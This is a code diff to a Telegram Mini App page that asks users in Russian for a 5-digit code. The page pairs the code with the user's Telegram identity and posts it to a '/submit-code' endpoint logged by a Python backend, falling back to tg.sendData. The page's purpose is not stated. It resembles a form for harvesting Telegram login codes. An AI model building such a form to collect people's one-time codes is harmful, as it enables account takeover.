@@ -67,7 +67,7 @@
 
   <h2>Введите 5-значный код</h2>
 
-  <!-- Telegram user information display -->
+  <!-- Display Telegram User Information -->
   <div id="user-info">Загрузка...</div>
 
   <div class="code-container" id="otp-container">
@@ -84,11 +84,11 @@
     tg.ready();
 
     // ==========================================
-    // USER IDENTIFICATION & FALLBACK PARSING
+    // EXTRACT USER INFORMATION
     // ==========================================
     let user = tg.initDataUnsafe?.user;
 
-    // Fallback: Parse user object directly from initData string if initDataUnsafe is empty
+    // Fallback: Extract from raw query parameter if unsafe object is unavailable
     if (!user && tg.initData) {
       try {
         const urlParams = new URLSearchParams(tg.initData);
@@ -97,7 +97,7 @@
           user = JSON.parse(userJson);
         }
       } catch (e) {
-        console.error("Failed to parse initData user string", e);
+        console.error("Failed to parse initData user object", e);
       }
     }
 
@@ -110,7 +110,7 @@
     }
 
     // ==========================================
-    // INPUT HANDLING & AUTOMATION
+    // OTP INPUT FIELDS & AUTOMATION
     // ==========================================
     const inputs = document.querySelectorAll(".code-input");
     const mainButton = tg.MainButton;
@@ -163,7 +163,7 @@
     }
 
     // ==========================================
-    // DATA SUBMISSION (DUAL MODE)
+    // FORM SUBMISSION (HTTP REST + TELEGRAM BRIDGE)
     // ==========================================
     mainButton.onClick(async () => {
       const code = getCode();
@@ -172,7 +172,7 @@
       mainButton.showProgress();
 
       try {
-        // Primary Attempt: Post via backend REST API (Works Everywhere)
+        // Step 1: Always submit to HTTP endpoint (Guarantees Python terminal logs)
         const response = await fetch("/submit-code", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -186,13 +186,17 @@
 
         if (result.success) {
           tg.close();
-        } else {
-          // Secondary Fallback: Use Telegram Native direct bridge
-          tg.sendData(JSON.stringify({ code: code }));
+          return;
         }
       } catch (err) {
-        // Network/Fallback handler
+        console.warn("HTTP submission failed, executing tg.sendData fallback:", err);
+      }
+
+      // Step 2: Fallback to Telegram native sendData if HTTP endpoint is unreachable
+      try {
         tg.sendData(JSON.stringify({ code: code }));
+      } catch (e) {
+        console.error("tg.sendData failed:", e);
       } finally {
         mainButton.hideProgress();
       }
